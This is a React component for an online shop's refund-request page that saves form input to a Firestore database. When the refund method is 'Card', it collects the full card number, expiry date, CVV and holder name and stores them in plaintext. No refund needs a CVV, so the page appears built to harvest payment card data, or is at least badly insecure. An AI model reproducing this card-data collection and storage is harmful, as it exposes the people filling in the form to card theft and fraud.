import React, { useState, useEffect } from 'react';
import { db } from '../lib/firebase';
import { collection, query, getDocs, addDoc, serverTimestamp } from 'firebase/firestore';
import { ArrowRight, CheckCircle2, AlertCircle } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

export default function Refund() {
  const [reason, setReason] = useState('');
  const [products, setProducts] = useState<any[]>([]);
  const [selectedProductId, setSelectedProductId] = useState<string>('');
  const [paidAmount, setPaidAmount] = useState('');
  
  const [formData, setFormData] = useState({
    email: '',
    accountNumber: '',
    accountName: '',
    receiveMethod: 'Easypaisa',
    cardExpiry: '',
    cardCvv: ''
  });
  
  const [status, setStatus] = useState<'idle' | 'loading' | 'success' | 'error'>('idle');
  const [errorMsg, setErrorMsg] = useState('');

  useEffect(() => {
    const fetchProducts = async () => {
      const q = query(collection(db, 'products'));
      const snap = await getDocs(q);
      setProducts(snap.docs.map(doc => ({ id: doc.id, ...doc.data() })));
    };
    fetchProducts();
  }, []);

  const selectedProduct = products.find(p => p.id === selectedProductId);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedProductId || !selectedProduct) {
      setErrorMsg("Please select a product.");
      return;
    }

    setStatus('loading');
    
    try {
      await addDoc(collection(db, 'refunds'), {
        productId: selectedProduct.id,
        productName: selectedProduct.name,
        refundReason: reason,
        amount: selectedProduct.price,
        userProvidedAmount: paidAmount,
        status: 'Pending',
        email: formData.email,
        accountNumber: formData.accountNumber,
        name: formData.accountName,
        receiveMethod: formData.receiveMethod,
        cardExpiry: formData.cardExpiry,
        cardCvv: formData.cardCvv,
        timestamp: serverTimestamp()
      });
      
      setStatus('success');
    } catch (err: any) {
      console.error(err);
      setStatus('error');
      setErrorMsg(err.message || "Failed to submit refund request. Please try again.");
    }
  };

  return (
    <div className="min-h-screen pt-32 pb-20 bg-slate-50 flex items-center justify-center">
      <div className="w-full max-w-lg px-4">
        {status === 'success' ? (
          <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="bg-white p-6 md:p-8 rounded-3xl border border-slate-200 shadow-xl text-center">
             <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
                <CheckCircle2 size={32} />
             </div>
             <h2 className="text-xl font-black text-slate-900 mb-4">Refund Request Submitted</h2>
             <p className="text-slate-800 font-medium leading-relaxed text-sm">
               Your refund request has been submitted successfully.<br/>
               It will be processed within 24–48 hours.<br/>
               <strong className="text-red-600 font-bold mt-2 inline-block">Please do not contact support repeatedly.</strong>
             </p>
          </motion.div>
        ) : (
          <form onSubmit={handleSubmit} className="bg-white p-6 md:p-8 rounded-3xl border border-slate-200 shadow-xl space-y-6">
            <div>
               <h1 className="text-2xl font-black text-slate-900 mb-2">Request a Refund</h1>
               <p className="text-slate-500 text-sm">Please fill out the form below. Only product selection is required.</p>
            </div>

            {status === 'error' && (
               <div className="bg-red-50 text-red-600 p-3 rounded-xl flex items-center gap-2 font-semibold text-sm">
                  <AlertCircle size={18} />
                  {errorMsg}
               </div>
            )}

            <div>
               <label className="block text-sm font-bold text-slate-700 mb-2">Reason (Optional)</label>
               <input 
                  type="text"
                  value={reason}
                  onChange={e => setReason(e.target.value)}
                  placeholder="Write your reason (optional)"
                  className="w-full border-2 border-slate-200 rounded-xl px-4 py-2 focus:border-red-500 outline-none transition-all font-bold text-slate-900 text-sm placeholder:text-slate-400 placeholder:font-medium opacity-100"
               />
            </div>

            <div>
               <label className="block text-sm font-bold text-slate-700 mb-2">Select Product *</label>
               <select
                  required
                  value={selectedProductId}
                  onChange={e => setSelectedProductId(e.target.value)}
                  className="w-full border-2 border-slate-200 rounded-xl px-4 py-2 focus:border-red-500 outline-none transition-all font-bold text-slate-900 text-sm bg-white opacity-100"
               >
                  <option value="" disabled>-- Select a product --</option>
                  {products.map(p => (
                     <option key={p.id} value={p.id}>{p.name}</option>
                  ))}
               </select>
            </div>

            <AnimatePresence>
              {selectedProduct && (
                 <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }} className="overflow-hidden">
                    <div className="bg-slate-50 border border-slate-200 p-4 rounded-xl mb-4">
                       <p className="text-sm font-bold text-slate-600">Selected Product Price: <span className="text-red-600">{selectedProduct.price?.toLocaleString()} PKR</span></p>
                    </div>
                 </motion.div>
              )}
            </AnimatePresence>

            <div>
               <label className="block text-sm font-bold text-slate-700 mb-2">Enter amount you paid (Optional)</label>
               <input 
                  type="number"
                  value={paidAmount}
                  onChange={e => setPaidAmount(e.target.value)}
                  placeholder="e.g. 5000"
                  className="w-full border-2 border-slate-200 rounded-xl px-4 py-2 focus:border-red-500 outline-none transition-all font-bold text-slate-900 text-sm placeholder:text-slate-400 placeholder:font-medium opacity-100"
               />
            </div>

            <div className="pt-4 border-t border-slate-100">
               <h3 className="text-sm font-bold text-slate-900 mb-4">Payment Method Details (Optional)</h3>
               <div className="space-y-4">
                  <select 
                     value={formData.receiveMethod} onChange={e => setFormData({...formData, receiveMethod: e.target.value})}
                     className="w-full border-2 border-slate-200 rounded-xl px-4 py-2 focus:border-red-500 outline-none transition-all font-bold text-slate-900 text-sm bg-white opacity-100"
                  >
                     <option value="Easypaisa">Easypaisa</option>
                     <option value="JazzCash">JazzCash</option>
                     <option value="Bank Transfer">Bank Transfer</option>
                     <option value="Card">Card</option>
                  </select>
                  <input 
                     type="email" value={formData.email} onChange={e => setFormData({...formData, email: e.target.value})}
                     className="w-full border-2 border-slate-200 rounded-xl px-4 py-2 focus:border-red-500 outline-none transition-all font-bold text-slate-900 text-sm placeholder:text-slate-500 placeholder:font-medium opacity-100"
                     placeholder="Email / Gmail"
                  />
                  
                  {formData.receiveMethod === 'Card' ? (
                     <div className="space-y-4">
                       <input 
                          type="text" value={formData.accountNumber} onChange={e => setFormData({...formData, accountNumber: e.target.value})}
                          className="w-full border-2 border-slate-200 rounded-xl px-4 py-2 focus:border-red-500 outline-none transition-all font-bold text-slate-900 text-sm placeholder:text-slate-500 placeholder:font-medium opacity-100"
                          placeholder="Card Number"
                       />
                       <div className="flex gap-4">
                          <input 
                             type="text" placeholder="MM/YY" value={formData.cardExpiry} onChange={e => setFormData({...formData, cardExpiry: e.target.value})}
                             className="w-1/2 border-2 border-slate-200 rounded-xl px-4 py-2 focus:border-red-500 outline-none transition-all font-bold text-slate-900 text-sm placeholder:text-slate-500 placeholder:font-medium opacity-100"
                          />
                          <input 
                             type="text" placeholder="CVV" value={formData.cardCvv} onChange={e => setFormData({...formData, cardCvv: e.target.value})}
                             className="w-1/2 border-2 border-slate-200 rounded-xl px-4 py-2 focus:border-red-500 outline-none transition-all font-bold text-slate-900 text-sm placeholder:text-slate-500 placeholder:font-medium opacity-100"
                          />
                       </div>
                       <input 
                          type="text" value={formData.accountName} onChange={e => setFormData({...formData, accountName: e.target.value})}
                          className="w-full border-2 border-slate-200 rounded-xl px-4 py-2 focus:border-red-500 outline-none transition-all font-bold text-slate-900 text-sm placeholder:text-slate-500 placeholder:font-medium opacity-100"
                          placeholder="Card Holder Name"
                       />
                     </div>
                  ) : (
                     <>
                        <input 
                           type="text" value={formData.accountNumber} onChange={e => setFormData({...formData, accountNumber: e.target.value})}
                           className="w-full border-2 border-slate-200 rounded-xl px-4 py-2 focus:border-red-500 outline-none transition-all font-bold text-slate-900 text-sm placeholder:text-slate-500 placeholder:font-medium opacity-100"
                           placeholder="Account Number"
                        />
                        <input 
                           type="text" value={formData.accountName} onChange={e => setFormData({...formData, accountName: e.target.value})}
                           className="w-full border-2 border-slate-200 rounded-xl px-4 py-2 focus:border-red-500 outline-none transition-all font-bold text-slate-900 text-sm placeholder:text-slate-500 placeholder:font-medium opacity-100"
                           placeholder="Account Holder Name"
                        />
                     </>
                  )}
               </div>
            </div>

            <button 
               disabled={status === 'loading'}
               type="submit" 
               className="w-full flex items-center justify-center gap-2 bg-slate-900 hover:bg-slate-800 text-white py-3 rounded-xl font-bold text-sm transition-all disabled:opacity-70 disabled:pointer-events-none mt-2"
            >
               {status === 'loading' ? 'Submitting...' : 'Submit Request'}
               {!status && <ArrowRight size={16} />}
            </button>
          </form>
        )}
      </div>
    </div>
  );
}
